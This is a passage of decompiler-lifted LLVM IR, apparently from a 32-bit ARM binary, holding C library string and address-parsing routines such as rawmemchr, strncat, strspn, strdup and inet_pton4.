  %v0_161a0 = phi i32 [ %v6_1618c, %entry ], [ %v0_161a0.pre, %bb ]
  ret i32 %v0_161a0

; uselistorder directives
  uselistorder i32 %v6_1618c, { 0, 2, 1 }
  uselistorder i32 %v2_16188, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_161cc:
  %v1_161ac = urem i32 %arg1, 256
  store i32 %v1_161ac, i32* @lr, align 4
  %v4_161cc = mul nuw nsw i32 %v1_161ac, 256
  %v5_161cc = or i32 %v4_161cc, %v1_161ac
  %v4_161d4 = mul i32 %v5_161cc, 65536
  %v5_161d4 = or i32 %v4_161d4, %v5_161cc
  %v0_161d8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_161d8

dec_label_pc_161d8:                               ; preds = %dec_label_pc_16244, %dec_label_pc_161d8, %dec_label_pc_161cc
  %v0_161d8 = phi i32 [ %v0_161d8.pre, %dec_label_pc_161cc ], [ %v4_161d8, %dec_label_pc_161d8 ], [ %v4_161d8, %dec_label_pc_16244 ]
  %v1_161d8 = inttoptr i32 %v0_161d8 to i32*
  %v2_161d8 = load i32, i32* %v1_161d8, align 4
  %v4_161d8 = add i32 %v0_161d8, 4
  store i32 %v4_161d8, i32* @ip, align 4
  %v2_161e0 = xor i32 %v2_161d8, %v5_161d4
  %v2_161e4 = add i32 %v2_161e0, 2130640639
  %v1_161ec = sub i32 -1, %v2_161e0
  %v2_161f0 = xor i32 %v2_161e4, %v1_161ec
  %v2_161f4 = and i32 %v2_161f0, -2130640640
  %v2_161f8 = icmp eq i32 %v2_161f4, 0
  br i1 %v2_161f8, label %dec_label_pc_161d8, label %dec_label_pc_16200

dec_label_pc_16200:                               ; preds = %dec_label_pc_161d8
  %v2_16200 = inttoptr i32 %v0_161d8 to i8*
  %v3_16200 = load i8, i8* %v2_16200, align 1
  %v4_16200 = zext i8 %v3_16200 to i32
  %v9_16208 = icmp eq i32 %v4_16200, %v1_161ac
  store i1 %v9_16208, i1* @cpsr_z, align 1
  %v1_1620c = add i32 %v0_161d8, 3
  %v1_16210 = add i32 %v0_161d8, 1
  %v1_16214 = add i32 %v0_161d8, 2
  br i1 %v9_16208, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_16200
  ret i32 %v0_161d8

bb18:                                             ; preds = %dec_label_pc_16200
  %v2_1621c = inttoptr i32 %v1_16210 to i8*
  %v3_1621c = load i8, i8* %v2_1621c, align 1
  %v4_1621c = zext i8 %v3_1621c to i32
  %v9_16220 = icmp eq i32 %v4_1621c, %v1_161ac
  store i1 %v9_16220, i1* @cpsr_z, align 1
  br i1 %v9_16220, label %dec_label_pc_16228, label %dec_label_pc_16230

dec_label_pc_16228:                               ; preds = %bb18
  ret i32 %v1_16210

dec_label_pc_16230:                               ; preds = %bb18
  %v2_16230 = inttoptr i32 %v1_16214 to i8*
  %v3_16230 = load i8, i8* %v2_16230, align 1
  %v4_16230 = zext i8 %v3_16230 to i32
  %v9_16234 = icmp eq i32 %v4_16230, %v1_161ac
  store i1 %v9_16234, i1* @cpsr_z, align 1
  br i1 %v9_16234, label %dec_label_pc_1623c, label %dec_label_pc_16244

dec_label_pc_1623c:                               ; preds = %dec_label_pc_16230
  ret i32 %v1_16214

dec_label_pc_16244:                               ; preds = %dec_label_pc_16230
  %v2_16244 = inttoptr i32 %v1_1620c to i8*
  %v3_16244 = load i8, i8* %v2_16244, align 1
  %v4_16244 = zext i8 %v3_16244 to i32
  %v9_16248 = icmp eq i32 %v4_16244, %v1_161ac
  store i1 %v9_16248, i1* @cpsr_z, align 1
  br i1 %v9_16248, label %dec_label_pc_16250, label %dec_label_pc_161d8

dec_label_pc_16250:                               ; preds = %dec_label_pc_16244
  ret i32 %v1_1620c

; uselistorder directives
  uselistorder i32 %v4_161d8, { 2, 1, 0 }
  uselistorder i32 %v0_161d8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_161cc, { 1, 0 }
  uselistorder i32 %v1_161ac, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 8, 9, 10, 11, 1, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 0, 2, 3, 14, 4, 5, 6, 7, 23 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 5, 6, 1, 0, 2, 3, 4 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16260 = load i32, i32* @r4, align 4
  store i32 %v3_16260, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1626c

dec_label_pc_1626c:                               ; preds = %dec_label_pc_1626c, %entry
  %v0_1626c = phi i32 [ %v5_1626c, %dec_label_pc_1626c ], [ %tmp, %entry ]
  %v1_1626c = inttoptr i32 %v0_1626c to i8*
  %v2_1626c = load i8, i8* %v1_1626c, align 1
  %v3_1626c = zext i8 %v2_1626c to i32
  store i32 %v3_1626c, i32* @ip, align 4
  %v5_1626c = add i32 %v0_1626c, 1
  store i32 %v5_1626c, i32* %r3.global-to-local, align 4
  %v2_16270 = icmp eq i8 %v2_1626c, 0
  store i1 %v2_16270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16270, label %dec_label_pc_16278, label %dec_label_pc_1626c

dec_label_pc_16278:                               ; preds = %dec_label_pc_1626c
  %v0_16278 = load i32, i32* %r2.global-to-local, align 4
  %v7_16278 = icmp eq i32 %v0_16278, 3
  store i1 %v7_16278, i1* %cpsr_z.global-to-local, align 1
  %v1_1627c = add i32 %v0_1626c, -1
  store i32 %v1_1627c, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_16278, 4
  br i1 %tmp10, label %dec_label_pc_16310thread-pre-split, label %dec_label_pc_16284

dec_label_pc_16284:                               ; preds = %dec_label_pc_16278
  %v3_16284 = udiv i32 %v0_16278, 4
  store i32 %v3_16284, i32* %r0.global-to-local, align 4
  %v0_16288.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_16288

dec_label_pc_16288:                               ; preds = %dec_label_pc_162e8, %dec_label_pc_16284
  %v2_16290 = phi i32 [ %v1_162e0, %dec_label_pc_162e8 ], [ %v1_1627c, %dec_label_pc_16284 ]
  %v0_16288 = phi i32 [ %v1_162dc, %dec_label_pc_162e8 ], [ %v0_16288.pre, %dec_label_pc_16284 ]
  %v1_16288 = inttoptr i32 %v0_16288 to i8*
  %v2_16288 = load i8, i8* %v1_16288, align 1
  %v3_16288 = zext i8 %v2_16288 to i32
  store i32 %v3_16288, i32* %r3.global-to-local, align 4
  %v2_1628c = icmp eq i8 %v2_16288, 0
  store i1 %v2_1628c, i1* %cpsr_z.global-to-local, align 1
  %v3_16290 = add i32 %v2_16290, 1
  %v4_16290 = inttoptr i32 %v3_16290 to i8*
  store i8 %v2_16288, i8* %v4_16290, align 1
  %v0_16294 = load i32, i32* %lr.global-to-local, align 4
  %v1_16294 = add i32 %v0_16294, 1
  store i32 %v1_16294, i32* @ip, align 4
  %v0_16298 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16298, label %.loopexit, label %dec_label_pc_1629c

dec_label_pc_1629c:                               ; preds = %dec_label_pc_16288
  %v0_1629c = load i32, i32* @r1, align 4
  %v1_1629c = add i32 %v0_1629c, 1
  %v2_1629c = inttoptr i32 %v1_1629c to i8*
  %v3_1629c = load i8, i8* %v2_1629c, align 1
  %v4_1629c = zext i8 %v3_1629c to i32
  store i32 %v4_1629c, i32* %r3.global-to-local, align 4
  %v2_162a0 = icmp eq i8 %v3_1629c, 0
  store i1 %v2_162a0, i1* %cpsr_z.global-to-local, align 1
  %v3_162a4 = add i32 %v0_16294, 2
  %v4_162a4 = inttoptr i32 %v3_162a4 to i8*
  store i8 %v3_1629c, i8* %v4_162a4, align 1
  %v0_162a8 = load i32, i32* @r1, align 4
  %v1_162a8 = add i32 %v0_162a8, 1
  store i32 %v1_162a8, i32* %r1.global-to-local, align 4
  %v0_162ac = load i32, i32* @ip, align 4
  %v1_162ac = add i32 %v0_162ac, 1
  store i32 %v1_162ac, i32* @ip, align 4
  %v0_162b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_162b0, label %.loopexit, label %dec_label_pc_162b4

dec_label_pc_162b4:                               ; preds = %dec_label_pc_1629c
  %v1_162b4 = add i32 %v0_162a8, 2
  %v2_162b4 = inttoptr i32 %v1_162b4 to i8*
  %v3_162b4 = load i8, i8* %v2_162b4, align 1
  %v4_162b4 = zext i8 %v3_162b4 to i32
  store i32 %v4_162b4, i32* %r3.global-to-local, align 4
  %v2_162b8 = icmp eq i8 %v3_162b4, 0
  store i1 %v2_162b8, i1* %cpsr_z.global-to-local, align 1
  %v3_162bc = add i32 %v0_162ac, 2
  %v4_162bc = inttoptr i32 %v3_162bc to i8*
  store i8 %v3_162b4, i8* %v4_162bc, align 1
  %v0_162c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_162c0 = add i32 %v0_162c0, 1
  store i32 %v1_162c0, i32* %r1.global-to-local, align 4
  %v0_162c4 = load i32, i32* @ip, align 4
  %v1_162c4 = add i32 %v0_162c4, 1
  store i32 %v1_162c4, i32* %lr.global-to-local, align 4
  %v0_162c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_162c8, label %.loopexit, label %dec_label_pc_162cc

dec_label_pc_162cc:                               ; preds = %dec_label_pc_162b4
  %v1_162cc = add i32 %v0_162c0, 2
  %v2_162cc = inttoptr i32 %v1_162cc to i8*
  %v3_162cc = load i8, i8* %v2_162cc, align 1
  %v4_162cc = zext i8 %v3_162cc to i32
  store i32 %v4_162cc, i32* @ip, align 4
  store i32 %v1_162cc, i32* %r3.global-to-local, align 4
  %v2_162d4 = icmp eq i8 %v3_162cc, 0
  store i1 %v2_162d4, i1* %cpsr_z.global-to-local, align 1
  %v3_162d8 = add i32 %v0_162c4, 2
  %v4_162d8 = inttoptr i32 %v3_162d8 to i8*
  store i8 %v3_162cc, i8* %v4_162d8, align 1
  %v0_162dc = load i32, i32* %r3.global-to-local, align 4
  %v1_162dc = add i32 %v0_162dc, 1
  store i32 %v1_162dc, i32* @r1, align 4
  %v0_162e0 = load i32, i32* %lr.global-to-local, align 4
  %v1_162e0 = add i32 %v0_162e0, 1
  store i32 %v1_162e0, i32* %lr.global-to-local, align 4
  %v0_162e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_162e4, label %.loopexit, label %dec_label_pc_162e8

dec_label_pc_162e8:                               ; preds = %dec_label_pc_162cc
  %v0_162e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_162e8 = add i32 %v0_162e8, -1
  store i32 %v1_162e8, i32* %r0.global-to-local, align 4
  %v7_162e8 = icmp eq i32 %v0_162e8, 1
  store i1 %v7_162e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_162e8, label %dec_label_pc_162f0, label %dec_label_pc_16288

dec_label_pc_162f0:                               ; preds = %dec_label_pc_162e8
  %v0_162f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_162f0 = urem i32 %v0_162f0, 4
  store i32 %v1_162f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16310

dec_label_pc_162f8:                               ; preds = %dec_label_pc_16310
  %v0_162f8 = load i32, i32* @r1, align 4
  %v1_162f8 = inttoptr i32 %v0_162f8 to i8*
  %v2_162f8 = load i8, i8* %v1_162f8, align 1
  %v3_162f8 = zext i8 %v2_162f8 to i32
  store i32 %v3_162f8, i32* @ip, align 4
  %v2_162fc = icmp eq i8 %v2_162f8, 0
  store i1 %v2_162fc, i1* %cpsr_z.global-to-local, align 1
  %v1_16300 = add i32 %v1_1631c, -1
  store i32 %v1_16300, i32* %r2.global-to-local, align 4
  %v3_16304 = add i32 %v3_1631c, 1
  %v4_16304 = inttoptr i32 %v3_16304 to i8*
  store i8 %v2_162f8, i8* %v4_16304, align 1
  %v5_16304 = load i32, i32* %lr.global-to-local, align 4
  %v6_16304 = add i32 %v5_16304, 1
  store i32 %v6_16304, i32* %lr.global-to-local, align 4
  %v0_16308 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16308, label %.loopexit, label %dec_label_pc_1630c

dec_label_pc_1630c:                               ; preds = %dec_label_pc_162f8
  %v0_1630c = load i32, i32* @r1, align 4
  %v1_1630c = add i32 %v0_1630c, 1
  store i32 %v1_1630c, i32* @r1, align 4
  %v0_16310.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16310thread-pre-split

dec_label_pc_16310thread-pre-split:               ; preds = %dec_label_pc_1630c, %dec_label_pc_16278
  %v2_163046 = phi i32 [ %v6_16304, %dec_label_pc_1630c ], [ %v1_1627c, %dec_label_pc_16278 ]
  %v0_16310.pr = phi i32 [ %v0_16310.pr.pre, %dec_label_pc_1630c ], [ %v0_16278, %dec_label_pc_16278 ]
  br label %dec_label_pc_16310

dec_label_pc_16310:                               ; preds = %dec_label_pc_16310thread-pre-split, %dec_label_pc_162f0
  %v3_1631c = phi i32 [ %v2_163046, %dec_label_pc_16310thread-pre-split ], [ %v1_162e0, %dec_label_pc_162f0 ]
  %v1_1631c = phi i32 [ %v0_16310.pr, %dec_label_pc_16310thread-pre-split ], [ %v1_162f0, %dec_label_pc_162f0 ]
  %v2_16310 = icmp eq i32 %v1_1631c, 0
  store i1 %v2_16310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16310, label %dec_label_pc_16318, label %dec_label_pc_162f8

dec_label_pc_16318:                               ; preds = %dec_label_pc_16310
  %v0_16318 = load i32, i32* @ip, align 4
  %v2_16318 = icmp eq i32 %v0_16318, 0
  store i1 %v2_16318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16318, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_16318
  %v4_1631c = add i32 %v3_1631c, 1
  %v5_1631c = inttoptr i32 %v4_1631c to i8*
  store i8 0, i8* %v5_1631c, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_162cc, %dec_label_pc_162b4, %dec_label_pc_1629c, %dec_label_pc_16288, %dec_label_pc_162f8, %dec_label_pc_16318, %bb
  %v0_16320 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16320, i32* %r0.global-to-local, align 4
  %v2_16324 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16324, i32* @r4, align 4
  ret i32 %v0_16320

; uselistorder directives
  uselistorder i32 %v1_1631c, { 1, 0 }
  uselistorder i32 %v1_162f0, { 1, 0 }
  uselistorder i32 %v0_162e8, { 1, 0 }
  uselistorder i32 %v1_162e0, { 0, 2, 1 }
  uselistorder i32 %v1_162dc, { 1, 0 }
  uselistorder i32 %v0_16278, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1626c, { 1, 0 }
  uselistorder i32 %v0_1626c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_163602 = load i32, i32* @r0, align 4
  %v1_163603 = inttoptr i32 %v0_163602 to i8*
  %v2_163604 = load i8, i8* %v1_163603, align 1
  %v2_163646 = icmp eq i8 %v2_163604, 0
  br i1 %v2_163646, label %dec_label_pc_16370, label %dec_label_pc_1633c.preheader

dec_label_pc_16334:                               ; preds = %dec_label_pc_1633c
  %v1_16344 = add i32 %v0_16344, 1
  %v9_16334 = icmp eq i8 %v0_16350.in, %v2_1633c
  br i1 %v9_16334, label %dec_label_pc_16350, label %dec_label_pc_1633c

dec_label_pc_1633c:                               ; preds = %dec_label_pc_1633c.preheader, %dec_label_pc_16334
  %v0_16344 = phi i32 [ %tmp, %dec_label_pc_1633c.preheader ], [ %v1_16344, %dec_label_pc_16334 ]
  %v1_1633c = inttoptr i32 %v0_16344 to i8*
  %v2_1633c = load i8, i8* %v1_1633c, align 1
  %v3_1633c = zext i8 %v2_1633c to i32
  store i32 %v3_1633c, i32* @ip, align 4
  %v2_16340 = icmp eq i8 %v2_1633c, 0
  br i1 %v2_16340, label %dec_label_pc_16370, label %dec_label_pc_16334

dec_label_pc_16350:                               ; preds = %dec_label_pc_16334
  %v2_16350 = icmp eq i8 %v0_16350.in, 0
  br i1 %v2_16350, label %dec_label_pc_16370, label %dec_label_pc_16358

dec_label_pc_16358:                               ; preds = %dec_label_pc_16350
  %v1_16358 = add i32 %v0_16358, 1
  store i32 %v1_16358, i32* @lr, align 4
  %v1_1635c = add i32 %v0_1635c, 1
  %v1_16360 = inttoptr i32 %v1_1635c to i8*
  %v2_16360 = load i8, i8* %v1_16360, align 1
  %v2_16364 = icmp eq i8 %v2_16360, 0
  br i1 %v2_16364, label %dec_label_pc_16370, label %dec_label_pc_1633c.preheader

dec_label_pc_1633c.preheader:                     ; preds = %entry, %dec_label_pc_16358
  %v0_1635c = phi i32 [ %v1_1635c, %dec_label_pc_16358 ], [ %v0_163602, %entry ]
  %v0_16358 = phi i32 [ %v1_16358, %dec_label_pc_16358 ], [ 0, %entry ]
  %v0_16350.in = phi i8 [ %v2_16360, %dec_label_pc_16358 ], [ %v2_163604, %entry ]
  br label %dec_label_pc_1633c

dec_label_pc_16370:                               ; preds = %dec_label_pc_16350, %dec_label_pc_16358, %dec_label_pc_1633c, %entry
  %v0_16370 = phi i32 [ 0, %entry ], [ %v0_16358, %dec_label_pc_1633c ], [ %v1_16358, %dec_label_pc_16358 ], [ %v0_16358, %dec_label_pc_16350 ]
  ret i32 %v0_16370

; uselistorder directives
  uselistorder i8 %v0_16350.in, { 1, 0 }
  uselistorder i8 %v2_1633c, { 1, 2, 0 }
  uselistorder i32 %v0_16344, { 1, 0 }
  uselistorder label %dec_label_pc_16370, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1633c.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_16378 = load i32, i32* @r4, align 4
  store i32 %v3_16378, i32* %stack_var_-12, align 4
  %v6_16378 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_16380 = call i32 @strlen(i8* %arg1)
  %v1_16384 = add i32 %v3_16380, 1
  store i32 %v1_16384, i32* @r4, align 4
  %v1_1638c = call i32 @malloc(i32 %v1_16384)
  store i32 91040, i32* @lr, align 4
  %v1_1639c = icmp ne i32 %v1_1638c, 0
  call void @__pseudo_cond_branch(i1 %v1_1639c, i32 ptrtoint (i32* @global_var_11650.542 to i32))
  %v2_163a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_163a4, i32* @r4, align 4
  store i32 %v6_16378, i32* @r5, align 4
  ret i32 %v1_1638c

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 9, 10, 11, 8, 15, 13, 14, 12, 6, 2, 3, 0, 7, 1, 5 }
  uselistorder i32 (i32)* @malloc, { 8, 5, 4, 14, 15, 7, 6, 13, 12, 11, 10, 9, 3, 2, 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_163a8 = load i32, i32* @r5, align 4
  %v2_163b0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_163b0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_164383 = load i8, i8* %arg1, align 1
  %v3_164384 = zext i8 %v2_164383 to i32
  store i32 %v3_164384, i32* @ip, align 4
  %v5_164385 = add i32 %tmp, 1
  store i32 %v5_164385, i32* @r4, align 4
  %v2_1643c6 = icmp eq i8 %v2_164383, 0
  store i1 %v2_1643c6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1643c6, label %dec_label_pc_16448, label %dec_label_pc_163d0

dec_label_pc_163d0:                               ; preds = %entry, %dec_label_pc_16438.backedge
  %v0_16414 = phi i32 [ %v3_16438, %dec_label_pc_16438.backedge ], [ %v3_164384, %entry ]
  %v1_1644010.in = phi i32 [ %v3_16438, %dec_label_pc_16438.backedge ], [ %v3_164384, %entry ]
  %v1_1644010 = add nsw i32 %v1_1644010.in, -48
  %v2_163d0 = icmp ugt i32 %v1_1644010, 8
  %v7_163d0 = icmp eq i32 %v1_1644010, 9
  store i1 %v7_163d0, i1* %cpsr_z.global-to-local, align 1
  %v2_163d8 = xor i1 %v7_163d0, true
  %v3_163d8 = and i1 %v2_163d0, %v2_163d8
  br i1 %v3_163d8, label %dec_label_pc_16414, label %dec_label_pc_163dc

dec_label_pc_163dc:                               ; preds = %dec_label_pc_163d0
  %v0_163dc = load i32, i32* %r0.global-to-local, align 4
  %v1_163dc = inttoptr i32 %v0_163dc to i8*
  %v2_163dc = load i8, i8* %v1_163dc, align 1
  %v3_163dc = zext i8 %v2_163dc to i32
  %v3_163e4 = mul nuw nsw i32 %v3_163dc, 10
  %v4_163e4 = add nuw nsw i32 %v3_163e4, %v0_16414
  %v1_163e8 = add nsw i32 %v4_163e4, -48
  %v2_163ec = icmp ugt i32 %v1_163e8, 254
  %v7_163ec = icmp eq i32 %v1_163e8, 255
  store i1 %v7_163ec, i1* %cpsr_z.global-to-local, align 1
  %v2_163f0 = xor i1 %v7_163ec, true
  %v3_163f0 = and i1 %v2_163ec, %v2_163f0
  br i1 %v3_163f0, label %dec_label_pc_1646c, label %dec_label_pc_163f4

dec_label_pc_163f4:                               ; preds = %dec_label_pc_163dc
  %v0_163f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_163f4 = icmp eq i32 %v0_163f4, 0
  store i1 %v2_163f4, i1* %cpsr_z.global-to-local, align 1
  %v1_163f8 = trunc i32 %v1_163e8 to i8
  store i8 %v1_163f8, i8* %v1_163dc, align 1
  %v0_163fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_163fc, label %dec_label_pc_16400, label %dec_label_pc_16438.backedge

dec_label_pc_16400:                               ; preds = %dec_label_pc_163f4
  %v0_16400 = load i32, i32* @lr, align 4
  %v1_16400 = add i32 %v0_16400, 1
  store i32 %v1_16400, i32* @lr, align 4
  %v7_16404 = icmp eq i32 %v1_16400, 4
  store i1 %v7_16404, i1* %cpsr_z.global-to-local, align 1
  %v0_16408 = load i32, i32* %r1.global-to-local, align 4
  %v1_16408 = add i32 %v0_16408, 1
  store i32 %v1_16408, i32* %r1.global-to-local, align 4
  %v8_1640c = icmp sgt i32 %v1_16400, 4
  br i1 %v8_1640c, label %dec_label_pc_1646c, label %dec_label_pc_16438.backedge

dec_label_pc_16414:                               ; preds = %dec_label_pc_163d0
  %v7_16414 = icmp eq i32 %v0_16414, 46
  store i1 %v7_16414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16414, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_16414
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1646c

bb:                                               ; preds = %dec_label_pc_16414
  %v1_1641c = load i32, i32* %r1.global-to-local, align 4
  %v2_1641c = urem i32 %v1_1641c, 2
  %v2_16420 = icmp eq i32 %v2_1641c, 0
  store i1 %v2_16420, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_16420, label %dec_label_pc_1646c, label %dec_label_pc_1642c

dec_label_pc_1642c:                               ; preds = %bb
  %v0_1642c = load i32, i32* @lr, align 4
  %v7_1642c = icmp eq i32 %v0_1642c, 4
  store i1 %v7_1642c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1642c, label %dec_label_pc_1646c, label %dec_label_pc_16434

dec_label_pc_16434:                               ; preds = %dec_label_pc_1642c
  %v2_16434 = load i32, i32* %r0.global-to-local, align 4
  %v3_16434 = add i32 %v2_16434, 1
  %v4_16434 = inttoptr i32 %v3_16434 to i8*
  store i8 0, i8* %v4_16434, align 1
  %v5_16434 = load i32, i32* %r0.global-to-local, align 4
  %v6_16434 = add i32 %v5_16434, 1
  store i32 %v6_16434, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16438.backedge

dec_label_pc_16438.backedge:                      ; preds = %dec_label_pc_16434, %dec_label_pc_163f4, %dec_label_pc_16400
  %v0_16438 = load i32, i32* @r4, align 4
  %v1_16438 = inttoptr i32 %v0_16438 to i8*
  %v2_16438 = load i8, i8* %v1_16438, align 1
  %v3_16438 = zext i8 %v2_16438 to i32
  store i32 %v3_16438, i32* @ip, align 4
  %v5_16438 = add i32 %v0_16438, 1
  store i32 %v5_16438, i32* @r4, align 4
  %v2_1643c = icmp eq i8 %v2_16438, 0
  store i1 %v2_1643c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1643c, label %dec_label_pc_16438.dec_label_pc_16448_crit_edge, label %dec_label_pc_163d0

dec_label_pc_16438.dec_label_pc_16448_crit_edge:  ; preds = %dec_label_pc_16438.backedge
  %v0_16448.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_16448

dec_label_pc_16448:                               ; preds = %dec_label_pc_16438.dec_label_pc_16448_crit_edge, %entry
  %v0_16448 = phi i32 [ %v0_16448.pre, %dec_label_pc_16438.dec_label_pc_16448_crit_edge ], [ 0, %entry ]
  %v7_16448 = icmp eq i32 %v0_16448, 3
  store i1 %v7_16448, i1* %cpsr_z.global-to-local, align 1
  %v7_1644c = icmp slt i32 %v0_16448, 4
  br i1 %v7_1644c, label %dec_label_pc_1646c, label %dec_label_pc_16450

dec_label_pc_16450:                               ; preds = %dec_label_pc_16448
  %v0_16450 = load i32, i32* @r5, align 4
  store i32 %v0_16450, i32* @r0, align 4
  store i32 %v2_163b0, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1645c = call i32 @memcpy()
  br label %dec_label_pc_1646c

dec_label_pc_1646c:                               ; preds = %dec_label_pc_163dc, %dec_label_pc_16400, %bb, %dec_label_pc_1642c, %.thread12, %dec_label_pc_16448, %dec_label_pc_16450
  %storemerge = phi i32 [ 1, %dec_label_pc_16450 ], [ 0, %dec_label_pc_16448 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_1642c ], [ 0, %bb ], [ 0, %dec_label_pc_16400 ], [ 0, %dec_label_pc_163dc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_163a8, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_16448, { 1, 0 }
  uselistorder i32 %v3_16438, { 2, 1, 0 }
  uselistorder i32 %v0_16414, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 10, 2, 3, 0, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_1646c, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_16438.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_163d0, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_16474 = load i32, i32* @r4, align 4
  %v6_16474 = load i32, i32* @r5, align 4
  %v9_16474 = load i32, i32* @r6, align 4
  %v7_16478 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
